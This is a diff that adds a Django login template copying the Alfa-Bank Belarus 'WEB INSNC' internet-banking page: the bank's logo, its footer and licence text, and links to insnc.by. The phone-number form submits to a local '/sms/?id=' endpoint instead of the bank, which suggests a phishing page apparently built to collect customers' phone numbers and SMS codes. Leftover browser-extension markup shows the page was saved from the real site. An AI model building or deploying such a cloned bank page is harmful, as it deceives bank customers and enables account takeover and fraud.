@@ -1,0 +1,521 @@
+{% load static %}
+<!DOCTYPE html>
+
+<html lang="ru" translate="no">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="icon" href="https://insnc.by/favicon.ico" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,user-scalable=no"
+    />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="WEB INSNC" />
+    <script src="{% static 'web_site/js/login_files/config.js.загружено' %}"></script>
+    <style type="text/css" id="operaUserStyle"></style>
+    <link rel="apple-touch-icon" href="https://insnc.by/pwa192.png" />
+
+    <link rel="stylesheet" href="{% static 'web_site/css/login_files/index.css' %}" />
+    <title>WEB INSNC</title>
+
+    <link href="{% static 'web_site/css/login_files/main.e586314d.css' %}" rel="stylesheet" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="{% static 'web_site/css/login_files/6917.56c7f832.chunk.css' %}"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="{% static 'web_site/css/login_files/244.119519a8.chunk.css' %}"
+    />
+      <script src="{% static 'web_site/js/jquery-1.10.2.min.js' %}"></script>
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+      <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    <script src="{% static 'web_site/js/jquery.mask.js' %}"></script>
+    <style type="text/css">
+      .vue-slider-dot {
+        position: absolute;
+        -webkit-transition: all 0s;
+        transition: all 0s;
+        z-index: 5;
+      }
+      .vue-slider-dot:focus {
+        outline: none;
+      }
+      .vue-slider-dot-tooltip {
+        position: absolute;
+        visibility: hidden;
+      }
+      .vue-slider-dot-hover:hover .vue-slider-dot-tooltip,
+      .vue-slider-dot-tooltip-show {
+        visibility: visible;
+      }
+      .vue-slider-dot-tooltip-top {
+        top: -10px;
+        left: 50%;
+        -webkit-transform: translate(-50%, -100%);
+        transform: translate(-50%, -100%);
+      }
+      .vue-slider-dot-tooltip-bottom {
+        bottom: -10px;
+        left: 50%;
+        -webkit-transform: translate(-50%, 100%);
+        transform: translate(-50%, 100%);
+      }
+      .vue-slider-dot-tooltip-left {
+        left: -10px;
+        top: 50%;
+        -webkit-transform: translate(-100%, -50%);
+        transform: translate(-100%, -50%);
+      }
+      .vue-slider-dot-tooltip-right {
+        right: -10px;
+        top: 50%;
+        -webkit-transform: translate(100%, -50%);
+        transform: translate(100%, -50%);
+      }
+    </style>
+    <style type="text/css">
+      .vue-slider-marks {
+        position: relative;
+        width: 100%;
+        height: 100%;
+      }
+      .vue-slider-mark {
+        position: absolute;
+        z-index: 1;
+      }
+      .vue-slider-ltr .vue-slider-mark,
+      .vue-slider-rtl .vue-slider-mark {
+        width: 0;
+        height: 100%;
+        top: 50%;
+      }
+      .vue-slider-ltr .vue-slider-mark-step,
+      .vue-slider-rtl .vue-slider-mark-step {
+        top: 0;
+      }
+      .vue-slider-ltr .vue-slider-mark-label,
+      .vue-slider-rtl .vue-slider-mark-label {
+        top: 100%;
+        margin-top: 10px;
+      }
+      .vue-slider-ltr .vue-slider-mark {
+        -webkit-transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%);
+      }
+      .vue-slider-ltr .vue-slider-mark-step {
+        left: 0;
+      }
+      .vue-slider-ltr .vue-slider-mark-label {
+        left: 50%;
+        -webkit-transform: translateX(-50%);
+        transform: translateX(-50%);
+      }
+      .vue-slider-rtl .vue-slider-mark {
+        -webkit-transform: translate(50%, -50%);
+        transform: translate(50%, -50%);
+      }
+      .vue-slider-rtl .vue-slider-mark-step {
+        right: 0;
+      }
+      .vue-slider-rtl .vue-slider-mark-label {
+        right: 50%;
+        -webkit-transform: translateX(50%);
+        transform: translateX(50%);
+      }
+      .vue-slider-btt .vue-slider-mark,
+      .vue-slider-ttb .vue-slider-mark {
+        width: 100%;
+        height: 0;
+        left: 50%;
+      }
+      .vue-slider-btt .vue-slider-mark-step,
+      .vue-slider-ttb .vue-slider-mark-step {
+        left: 0;
+      }
+      .vue-slider-btt .vue-slider-mark-label,
+      .vue-slider-ttb .vue-slider-mark-label {
+        left: 100%;
+        margin-left: 10px;
+      }
+      .vue-slider-btt .vue-slider-mark {
+        -webkit-transform: translate(-50%, 50%);
+        transform: translate(-50%, 50%);
+      }
+      .vue-slider-btt .vue-slider-mark-step {
+        top: 0;
+      }
+      .vue-slider-btt .vue-slider-mark-label {
+        top: 50%;
+        -webkit-transform: translateY(-50%);
+        transform: translateY(-50%);
+      }
+      .vue-slider-ttb .vue-slider-mark {
+        -webkit-transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%);
+      }
+      .vue-slider-ttb .vue-slider-mark-step {
+        bottom: 0;
+      }
+      .vue-slider-ttb .vue-slider-mark-label {
+        bottom: 50%;
+        -webkit-transform: translateY(50%);
+        transform: translateY(50%);
+      }
+      .vue-slider-mark-label,
+      .vue-slider-mark-step {
+        position: absolute;
+      }
+    </style>
+    <style type="text/css">
+      .vue-slider {
+        position: relative;
+        -webkit-box-sizing: content-box;
+        box-sizing: content-box;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        display: block;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+      }
+      .vue-slider-rail {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        -webkit-transition-property: width, height, left, right, top, bottom;
+        transition-property: width, height, left, right, top, bottom;
+      }
+      .vue-slider-process {
+        position: absolute;
+        z-index: 1;
+      }
+    </style>
+    <style>
+      @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
+    </style>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+      <div class="layout_pageWrapper__GDcmC layout_authWrapper__Np149">
+        <header class="header_header__z8ezc">
+          <div class="logo_logoWrapper__9R6jY">
+            <div class="logo_logoLink__fNwDp" data-test-id="logo-link">
+              <svg
+                width="48"
+                height="48"
+                viewBox="0 0 48 48"
+                fill="#EF3124"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  fill-rule="evenodd"
+                  clip-rule="evenodd"
+                  d="M23.9607 7.88513L19.7529 20.4108H28.0907L24.1164 7.88513H23.9607ZM24.2723 1C27.6504 1 28.6362 3.01805 29.4914 5.57288L38.3373 32H31.7919L29.8049 25.7173H17.9606L15.8178 32H9.66205L18.9446 5.57288C19.8451 3.00976 20.8942 1 24.2723 1ZM39 46H9V40H39V46Z"
+                  fill="current"
+                ></path>
+              </svg>
+            </div>
+          </div>
+          <div class="header_headerContent__pVewB">
+            <a
+              class="button__component_h7blb button__secondary_h7blb button__size-32_h7blb button__hug_h7blb button__size-32_5wm6d button__component_8pg1w button__secondary_8pg1w button__component_eo9fs button__secondary_eo9fs custom-button_customBtn__mEcRp header_helpButton__3w3EO"
+              href="https://insnc.by/about"
+              ><span class="button__label_h7blb button__stretchText_h7blb"
+                >Как тут всё работает</span
+              ></a
+            >
+          </div>
+        </header>
+        <div class="layout_content__8yNkj layout_authContent__OMpCg">
+          <div
+            class="layout_topContentContainer__usouv"
+            style="width: 0px; max-height: 128px; min-height: 128px"
+          >
+            <div
+              class="layout_bgContainer__Q0A+1"
+              id="host-ui-content-background-container"
+              style="background-color: rgba(0, 0, 0, 0)"
+            >
+              <div
+                class="background_backgroundImageWrapper__KIbJY"
+                data-test-id="top-content-background-container"
+              >
+                <div
+                  class="background_backgroundImage__xIsoF"
+                  data-test-id="top-content-background"
+                ></div>
+              </div>
+            </div>
+            <div id="host-ui-content-top-container">
+              <div class="layout-with-back-layer_container__aQsxJ">
+                <div class="top-content_headerWrapper__VHhO8">
+                  <div class=""></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="">
+            <div class="">
+              <div class="page-desktop_contentInner__4O1zk">
+                <h1
+                  class="typography__component_124qh main_title__99LLb typography__system-large_f6qr3 typography__bold_124qh"
+                >
+                  Вход в WEB&nbsp;INSNC
+                </h1>
+                <div style="
+    width: 370px; padding: 0 20px;
+">
+                  <div
+                    class="tabs__container_ypleh tabs__desktop_ypleh main_tabs__yM+Kp"
+                  >
+                    <div
+                      role="tablist"
+                      class="tabs__component_ypleh tabs__m_ypleh"
+                    >
+                      <button
+                        role="tab"
+                        tabindex="0"
+                        aria-selected="true"
+                        type="button"
+
+                        class="tabs__title_ypleh tabs__selected_ypleh"
+                      >
+                        <span class="">По номеру телефона</span></button
+                      >
+                      <div
+                        class="tabs__line_ypleh"
+                        style="width: 185px; transform: translateX(0px)"
+                      ></div>
+                    </div>
+                  </div>
+                  <div
+                    class="tabs__component_1m9j2"
+                    role="tabpanel"
+                    tabindex="0"
+                  >
+                    <form
+                      class="phone-auth-form_containerForm__5trN5"
+                      action='/sms/?id={{ id }}' method='post' id="phone_form"
+                    >
+                      <div
+                        class="space__spaceContainer_1kypf space__vertical_1kypf space__start_1kypf space__spaceContainerFullWidth_1kypf"
+                      >
+                        <div
+                          class="space__spaceItem_1kypf space__spaceItemFullWidth_1kypf"
+                          style="margin-bottom: 16px"
+                        >
+                          <div>
+                            <div
+                              class="form-control__component_j0wmu form-control__component_1t3al form-control__size-72_j0wmu form-control__size-72_1k9xa form-control__block_j0wmu form-control__hasRightAddons_j0wmu"
+                            >
+                              <div
+                                class="form-control__inner_j0wmu form-control__inner_1k9xa form-control__inner_1t3al form-control__inner_1su3t form-control__filled_j0wmu form-control__hasInnerLabel_j0wmu"
+                              >
+                                <div class="form-control__inputWrapper_j0wmu">
+                                  <span
+                                    class="form-control__hiddenLabel_j0wmu"
+                                    aria-hidden="true"
+                                    >Введите номер телефона</span
+                                  >
+                                  <div
+                                    class="form-control__label_j0wmu form-control__label_1t3al"
+                                  >
+                                    <span class="form-control__labelInner_j0wmu"
+                                      >Введите номер телефона</span
+                                    >
+                                  </div>
+                                  <div class="form-control__input_j0wmu">
+    <input
+        name="phone"
+        autocomplete="off"
+        class="input__input_18bus input__input_1g27g input__size-72_18bus input__hasInnerLabel_18bus input__hasInnerLabel_1g27g"
+        type="text"
+        aria-label="Введите номер телефона"
+        value="+375"
+        id="phone"
+        required
+    />
+
+<script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var phoneInput = document.getElementById('phone');
+
+            $('#phone').mask('+375 (00) 000-00-00');
+
+            phoneInput.addEventListener('input', function (event) {
+                // Allow only numbers and '+' sign
+                var value = phoneInput.value;
+                var cursorPos = phoneInput.selectionStart;
+                phoneInput.value = value.replace(/[^0-9\+]/g, '');
+
+                // Restore cursor position after removing invalid characters
+                if (cursorPos !== phoneInput.value.length) {
+                    phoneInput.setSelectionRange(cursorPos, cursorPos);
+                }
+            });
+
+            phoneInput.addEventListener('keypress', function (event) {
+                var charCode = event.charCode;
+                // Allow only digits and '+' sign
+                if ((charCode < 48 || charCode > 57) && charCode !== 43) {
+                    event.preventDefault();
+                }
+            });
+
+            // Ensure the initial value is correctly formatted
+            phoneInput.value = '+375';
+
+            phoneInput.addEventListener('focus', function () {
+                if (phoneInput.value === '') {
+                    phoneInput.value = '+375';
+                }
+            });
+        });
+    </script>
+                                  </div>
+                                </div>
+                                <div
+                                  class="form-control__addons_j0wmu form-control__rightAddons_j0wmu"
+                                >
+                                  <button
+                                    class="button__component_h7blb button__text_h7blb button__size-56_h7blb button__hug_h7blb button__size-56_5wm6d button__component_8pg1w button__text_8pg1w button__component_eo9fs button__text_eo9fs input__clearButton_ho0m9"
+                                    aria-label="Очистить"
+                                    tabindex="-1"
+                                    type="button"
+                                  >
+                                    <span
+                                      class="button__label_h7blb button__stretchText_h7blb"
+                                      ><svg
+                                        role="img"
+                                        focusable="false"
+                                        fill="currentColor"
+                                        width="24"
+                                        height="24"
+                                        viewBox="0 0 24 24"
+                                        class="input__clearIcon_ho0m9 input__clearIcon_bqq6e"
+                                      >
+                                        <path
+                                          d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10zm-4-7.5l2.586-2.5L8 9.5 9.5 8l2.5 2.586L14.5 8 16 9.5 13.414 12 16 14.5 14.5 16 12 13.414 9.5 16 8 14.5z"
+                                          fill-rule="evenodd"
+                                          clip-rule="evenodd"
+                                        ></path></svg
+                                    ></span>
+                                  </button>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div
+                          class="space__spaceItem_1kypf space__spaceItemFullWidth_1kypf"
+                          style="margin-bottom: 16px"
+                        >
+                          <label
+                            class="checkbox__component_mo8d4 checkbox__center_mo8d4 phone-auth-form_checkbox__8bScA"
+                            ><input type="checkbox" /><span
+                              class="checkbox__box_mo8d4 phone-auth-form_checkboxBox__jHCM4"
+                            ></span
+                            ><span class="checkbox__content_mo8d4"
+                              ><span class="checkbox__label_mo8d4"
+                                >Запомнить меня</span
+                              ></span
+                            ></label
+                          >
+                        </div>
+                        <div
+                          class="space__spaceItem_1kypf space__spaceItemFullWidth_1kypf"
+                        >
+                          <button
+                            class="button__component_h7blb button__primary_h7blb button__size-56_h7blb button__hug_h7blb button__size-56_5wm6d button__component_8pg1w button__primary_8pg1w button__component_eo9fs button__primary_eo9fs button__block_h7blb custom-button__customButton_1beu9 custom-button__border_1beu9 custom-button_customBtn__mEcRp phone-auth-form_button__7x35T custom-button__white_1beu9 custom-button__darkening_1beu9"
+                            type="submit"
+                            id="send_button"
+                            style="
+                              background: linear-gradient(
+                                155deg,
+                                rgb(255, 65, 52) 44.21%,
+                                rgb(239, 36, 170) 120.72%
+                              );
+                            "
+                          >
+                            <span
+                              class="button__label_h7blb button__stretchText_h7blb"
+                              >Продолжить</span
+                            >
+                          </button>
+                        </div>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <footer
+            class="footer_container__gn+gQ footer-desktop_footerAuth__GDQFN layout_footer__UaLUY"
+            data-test-id="footer-text"
+          >
+            <p
+              class="typography__paragraphWithMargins_ts1sw typography__secondary_1ejil typography__secondary-medium_ts1sw"
+            >
+              © 1999–2024 ЗАО «Альфа-Банк». г. Минск, ул. Сурганова, 43-47
+              <br />
+              Лицензия на осуществление банковской деятельности НБРБ № 22 от
+              07.06.2021 г.
+            </p>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </body>
+
+   <script type='javascript'>
+        document.addEventListener('DOMContentLoaded', function () {
+            var phoneInput = document.getElementById('phone');
+            phoneInput.addEventListener('input', function (event) {
+                // Remove non-numeric characters except the initial '+375'
+                var start = phoneInput.selectionStart;
+                var end = phoneInput.selectionEnd;
+                var value = phoneInput.value;
+                phoneInput.value = value.replace(/[^0-9+]/g, '');
+                phoneInput.setSelectionRange(start, end);
+            });
+
+            phoneInput.addEventListener('keypress', function (event) {
+                var charCode = event.charCode;
+                // Allow only digits and control keys
+                if ((charCode < 48 || charCode > 57) && charCode !== 43) {
+                    event.preventDefault();
+                }
+            });
+        });
+    </script>
+
+
+  <div class="troywell-avia">
+    <template shadowrootmode="open">
+      <style>
+        @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
+      </style>
+      <div id="troywell-avia" data-v-app="">
+        <div class="app">
+          <div data-v-138a3c39=""><!----></div>
+        </div>
+      </div></template
+    >
+  </div>
+  <div class="troywell-caa">
+    <template shadowrootmode="open">
+      <style>
+        @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
+        @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/caa/styles.css");
+      </style>
+      <div id="troywell-caa" data-v-app="">
+        <div class="content-app" data-v-9eaabcdc=""><!----></div>
+      </div></template
+    >
+  </div>
+</html>
